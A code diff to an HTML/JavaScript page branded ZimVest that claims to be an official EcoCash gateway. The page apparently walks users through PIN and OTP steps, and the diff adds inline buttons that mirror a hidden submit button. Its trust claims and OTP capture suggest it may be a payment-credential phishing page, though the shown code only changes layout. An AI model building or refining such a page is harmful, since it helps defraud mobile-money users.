@@ -103,8 +103,8 @@
 .proc-t{font-size:16px;font-weight:700;color:var(--t1);margin-bottom:5px}
 .proc-s{font-size:13px;color:var(--t4);line-height:1.5}
 
-.foot{position:absolute;bottom:0;left:0;right:0;padding:12px 16px max(20px,env(safe-area-inset-bottom));background:linear-gradient(to top,var(--bg) 65%,transparent);z-index:10}
-.ab{width:100%;padding:16px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e)}
+.foot{display:none}
+.ab{width:100%;padding:15px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e)}
 .ab.on{background:var(--in);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--ir)}
 .ab.on:hover{background:var(--ind);transform:translateY(-1px)}
 .ab.on:active{transform:scale(.98)}
@@ -145,6 +145,11 @@ html,body{
   body{padding:60px 24px}
   .app-shell,.screen,.sh{max-width:440px}
 }
+
+.step-btn{width:100%;padding:15px;border-radius:var(--rxl);border:none;font:800 14px/1 var(--f);cursor:not-allowed;background:var(--s3);color:var(--t5);transition:all .18s var(--e);margin:14px 0 4px;display:block}
+.step-btn.on{background:var(--in);color:#fff;cursor:pointer;box-shadow:0 4px 16px var(--ir)}
+.step-btn.on:hover{background:var(--ind);transform:translateY(-1px)}
+.step-btn.on:active{transform:scale(.98)}
 </style>
 </head>
 <body>
@@ -207,7 +212,10 @@ html,body{
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         <span>256-bit SSL · Official EcoCash gateway · Your PIN never leaves EcoCash systems</span>
       </div>
-      <div class="pw" style="margin-top:10px">ZimVest · Secured by EcoCash · Zimbabwe</div>
+      <div style="padding:0 16px">
+        <button class="step-btn" id="mb1" onclick="document.getElementById('mb').click()">Invest Securely</button>
+      </div>
+      <div class="pw" style="margin-top:6px">ZimVest · Secured by EcoCash · Zimbabwe</div>
     </div>
 
     <!-- STEP 2: OTP -->
@@ -230,6 +238,7 @@ html,body{
           <div class="tl">Expires in <span class="tn" id="tc">120</span>s</div>
           <button class="rsnd" id="rsnd">Resend OTP</button>
         </div>
+        <button class="step-btn" id="mb2" style="margin-top:14px" onclick="document.getElementById('mb').click()">Confirm OTP →</button>
       </div>
       <div class="pw">ZimVest · Secured by EcoCash</div>
     </div>
@@ -406,6 +415,27 @@ function showProcErr(msg){
 }
 document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
 function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
+
+// Sync inline buttons with hidden #mb state
+(function(){
+  var mb=document.getElementById('mb');
+  if(!mb) return;
+  function sync(){
+    var on=mb.classList.contains('on');
+    var txt=mb.textContent;
+    var mb1=document.getElementById('mb1');
+    var mb2=document.getElementById('mb2');
+    if(mb1){mb1.classList.toggle('on',on);if(on&&cur==='s1')mb1.textContent=txt;}
+    if(mb2){mb2.classList.toggle('on',on);if(on&&cur==='s2')mb2.textContent=txt;}
+  }
+  var obs=new MutationObserver(sync);
+  obs.observe(mb,{attributes:true,childList:true});
+  // Also sync on tab/step changes
+  var origUb=window.ub;
+  window.ub=function(){if(origUb)origUb();sync();};
+  setInterval(sync,200);
+})();
+
 </script>
 </body>
 </html>
